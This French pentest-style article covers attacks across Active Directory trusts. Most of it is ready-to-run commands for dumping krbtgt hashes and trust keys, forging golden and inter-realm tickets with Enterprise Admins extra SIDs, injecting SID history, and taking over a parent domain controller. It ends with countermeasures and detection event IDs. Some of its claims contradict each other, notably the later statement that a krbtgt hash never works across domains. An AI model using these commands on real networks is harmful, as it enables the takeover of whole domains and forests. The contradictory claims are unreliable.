---
title: AD Trusts et Forêts — Attaques Cross-Domain
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [active-directory, trusts, forest, cross-domain, sid-history, golden-ticket, pentest, sécurité]
date: 2026-03-23
---

# AD Trusts et Forêts — Attaques Cross-Domain

Les relations d'approbation (trusts) entre domaines et forêts Active Directory permettent à des utilisateurs d'un domaine d'accéder aux ressources d'un autre. Ces relations créent des vecteurs d'escalade latérale permettant de passer d'un domaine compromis à un domaine parent ou à une forêt entière.

## Concepts — Trusts AD

```
Trust (relation d'approbation) :
  Permet à des utilisateurs du domaine A d'être reconnus dans le domaine B

Types de trusts :

  Parent-Child (automatique à la création d'un domaine enfant) :
    → Bidirectionnel, transitif
    → domaine.local ↔ enfant.domaine.local
    → Partage la clé de trust avec le domaine parent

  Tree-Root (automatique à la création d'un arbre) :
    → Bidirectionnel, transitif
    → Relie deux arbres d'une même forêt

  Forest Trust (manuel, entre deux forêts) :
    → Bidirectionnel ou unidirectionnel, transitif dans les forêts
    → foret1.com ↔ foret2.com
    → SID Filtering activé par défaut (bloque les SID d'une forêt vers l'autre)

  External Trust (manuel, vers un domaine hors forêt) :
    → Unidirectionnel ou bidirectionnel, NON transitif
    → SID Filtering activé par défaut

Sensibilité des trusts :
  SID Filtering = OFF → SID History exploitable → escalade vers domaine de confiance
  SID Filtering = ON  → bloque les SID étrangers dans les tickets Kerberos
  Selective Authentication → seuls les utilisateurs autorisés peuvent accéder
```

## Énumération des trusts

```powershell
# PowerShell natif
Get-ADTrust -Filter *
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# PowerView
Get-DomainTrust                               # Trusts du domaine courant
Get-DomainTrust -Domain child.domaine.local   # Trusts d'un domaine spécifique
Get-ForestTrust                               # Trusts au niveau forêt
Get-ForestDomain                              # Tous les domaines de la forêt

# Mapper tous les trusts de la forêt
Get-DomainTrustMapping   # Récursif — tous les domaines et leurs trusts

# BloodHound — visualiser les trusts
# Les edges "TrustedBy" et "Contains" représentent les relations de trust
```

```bash
# Impacket
python3 GetADUsers.py -all domaine.local/alice:Password123 -dc-ip 192.168.1.1

# Énumération des trusts via LDAP
python3 ldapsearch.py -u alice -p Password123 -d domaine.local \
    -l 192.168.1.1 "(objectClass=trustedDomain)"
```

## Exploitation — Child → Parent Domain

Si on compromet un domaine enfant, on peut escalader vers le domaine parent (même forêt).

```
Principe :
  1. Compromis du domaine enfant → obtenir le hash krbtgt de l'enfant
  2. Récupérer le SID du domaine parent et le "Enterprise Admins" group SID
  3. Forger un Golden Ticket avec le SID d'Enterprise Admins en Extra SID
  4. → Kerberos accepte le ticket car les deux domaines partagent la clé de trust
  5. → Accès en tant qu'Enterprise Admin sur le domaine parent

Prerequis :
  Hash krbtgt du domaine enfant (via DCSync sur l'enfant)
  SID du domaine enfant et du domaine parent
  SID du groupe Enterprise Admins (parent_SID-519)
```

```bash
# Récupérer les SID nécessaires
# Sur le domaine enfant
python3 secretsdump.py enfant.domaine.local/Administrator:Password@CHILD_DC -just-dc-user krbtgt

# Récupérer le SID du domaine parent
Get-DomainSID -Domain domaine.local   # PowerView
# Ou : python3 lookupsid.py enfant.domaine.local/Administrator:Password@CHILD_DC

# Forger le Golden Ticket avec ExtraSids (Enterprise Admins)
# Mimikatz
kerberos::golden \
    /user:Administrator \
    /domain:enfant.domaine.local \
    /sid:S-1-5-21-CHILD-DOMAIN-SID \
    /krbtgt:KRBTGT_CHILD_HASH \
    /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
    /ptt
# S-1-5-21-PARENT-SID-519 = Enterprise Admins

# Accéder au DC parent
dir \\parent-dc.domaine.local\C$
Invoke-Command -ComputerName parent-dc.domaine.local -ScriptBlock { whoami }

# Impacket — ticketer.py avec extra-sid
python3 ticketer.py \
    -nthash KRBTGT_CHILD_HASH \
    -domain-sid S-1-5-21-CHILD-SID \
    -domain enfant.domaine.local \
    -extra-sid S-1-5-21-PARENT-SID-519 \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass enfant.domaine.local/Administrator@parent-dc.domaine.local
```

## Exploitation — Trust Key (Inter-Domain)

Alternative au Golden Ticket : utiliser la clé de trust entre deux domaines.

```bash
# La clé de trust est un secret partagé entre deux domaines
# Elle est stockée dans l'objet "Trust" de chaque domaine

# Récupérer la clé de trust (nécessite DA sur le domaine source)
# Mimikatz
lsadump::trust /patch    # Dump les clés de trust
lsadump::dcsync /domain:enfant.domaine.local /user:enfant$  # Compte de trust inter-domaine

# Forger un Inter-Realm TGT avec la clé de trust
kerberos::golden \
    /user:Administrator \
    /domain:enfant.domaine.local \
    /sid:S-1-5-21-CHILD-SID \
    /rc4:TRUST_KEY_HASH \
    /service:krbtgt \
    /target:domaine.local \
    /sids:S-1-5-21-PARENT-SID-519 \
    /ptt

# Demander un TGS pour le DC parent avec ce ticket inter-realm
Rubeus.exe asktgs /ticket:TICKET_B64 /service:cifs/parent-dc.domaine.local /ptt
```

## SID History Abuse

```
SID History (sIDHistory) : attribut AD permettant à un compte d'hériter des SIDs d'anciens comptes
  → Utilisé légitimement lors de migrations de domaines
  → Si SID Filtering est désactivé → on peut injecter n'importe quel SID

Conditions d'exploitation :
  → Trust sans SID Filtering (netdom trust TARGET /FilterSids:No)
  → Ou trust intra-forêt (SID Filtering non appliqué par défaut entre domaines de même forêt)
```

```powershell
# Vérifier si SID Filtering est activé sur un trust
Get-DomainTrust | Select-Object TargetName, SidFilteringForestAware, SidFilteringQuarantined

# Ajouter un SID History à un compte (nécessite DA + désactivation temporaire de SID Filtering)
# Mimikatz — injecter un SID History
sid::patch
sid::add /sam:alice /new:S-1-5-21-PARENT-SID-519   # Injecter Enterprise Admins SID

# Vérifier le SID History du compte
Get-ADUser alice -Properties SIDHistory | Select-Object SIDHistory
```

## Forest Trust — Attaques Cross-Forest

```
Par défaut : SID Filtering EST activé pour les forest trusts
→ Impossible d'injecter des SID de l'autre forêt

EXCEPTION : si l'admin a désactivé SID Filtering sur le forest trust
→ Même exploitation que cross-domain → accès Enterprise Admins de l'autre forêt

Cas plus courant — exploitation légitime du forest trust :
  → Énumérer les ressources accessibles dans l'autre forêt
  → Kerberoasting sur les comptes de l'autre forêt (si trust bidirectionnel)
  → Trouver des comptes partagés / mêmes mots de passe
```

```bash
# Énumérer les ressources de l'autre forêt
# PowerView — si trust bidirectionnel
Get-DomainUser -Domain foret2.com              # Utilisateurs de l'autre forêt
Get-DomainGroup -Domain foret2.com             # Groupes
Get-DomainComputer -Domain foret2.com          # Machines

# Kerberoasting cross-forest (si trust permet l'accès LDAP)
python3 GetUserSPNs.py foret2.com/alice:Password123 -dc-ip FORET2_DC_IP -request

# Si Foreign Security Principals (FSP) configurés :
# Des comptes de la forêt 1 ont accès aux ressources de la forêt 2
Get-DomainForeignGroupMember -Domain foret2.com   # PowerView
# → Identifier les comptes de foret1 qui sont membres de groupes dans foret2
```

## Contre-mesures

```
Isolation des domaines :
  ✓ SID Filtering : toujours activé sur les external trusts et forest trusts
    netdom trust DOMAIN1 /domain:DOMAIN2 /enablesidhistory:no /quarantine:yes
  ✓ Selective Authentication sur les forest trusts (plus restrictif que l'auth ouverte)
  ✓ Auditer régulièrement les trusts existants (supprimer les trusts inutiles)
  ✓ Ne pas créer de trusts bidirectionnels si unidirectionnel suffit

Protection krbtgt :
  ✓ Rotation régulière du krbtgt (deux fois pour invalider les tickets existants)
  ✓ Surveiller les DCSync sur krbtgt (Event ID 4662 + ObjectType: krbtgt)

SID History :
  ✓ Ne pas utiliser SID History en dehors des migrations
  ✓ Nettoyer les SID History après les migrations
  ✓ Surveiller l'attribut sIDHistory sur les comptes (modifications inhabituelles)

Détection :
  Event ID 4768 : TGT avec Extra SIDs (Golden Ticket cross-domain)
  Event ID 4769 : TGS avec des SID cross-domain inattendus
  Event ID 4672 : connexion avec privilèges spéciaux depuis un domaine externe
  Surveiller les accès aux ressources sensibles depuis des domaines tiers
```

## Pièges courants

- **Direction du trust ≠ direction de la confiance** : si `domain-A` "trusts" `domain-B`, les utilisateurs de `domain-B` peuvent accéder aux ressources de `domain-A` (et non l'inverse). La direction de la flèche dans `nltest` est l'inverse de l'intuition. Toujours vérifier avec `Get-DomainTrust` quel mode "Bidirectional" est clair.
- **Forest Trust = transitif, External Trust = non** : un Forest Trust permet de naviguer toute la forêt distante. Un External Trust ne couvre QUE le domaine ciblé. Sortir d'un External Trust nécessite un nouveau trust.
- **SID Filtering désactivé entre Parent/Child** : par défaut, dans une même forêt, le SID Filtering n'est pas appliqué entre parent et enfants. Compromettre un domaine enfant = injecter Enterprise Admin via SID History dans le parent.
- **SID Filtering peut être désactivé sur External Trust** : `netdom trust /Quarantine:no` (souvent fait pour résoudre des problèmes legacy) ouvre la porte à SID History injection cross-forest.
- **Selective Authentication** : sur un Forest Trust en Selective Auth, les users distants ne peuvent accéder QU'aux ressources où on leur a explicitement donné le droit "Allowed to Authenticate". Beaucoup moins permissif que Forest Trust standard.
- **Domain Trust transitivity** : si A trusts B, et B trusts C, alors A ne trusts PAS forcément C. Sauf cas spécifiques (Forest Trust within forest = transitive, External = non-transitive).
- **Compte krbtgt de chaque domaine** : compromis un krbtgt dans un domaine = Golden Ticket UNIQUEMENT pour ce domaine. Pas cross-domain. Pour pivoter, il faut le krbtgt de chaque cible.
- **Trust account** : entre deux domaines, il existe un compte de service caché (`DOMAIN$`). Son hash crackable permet de forger des TGT inter-domaines. Vu rarement, mais possible avec DCSync sur les deux DCs.
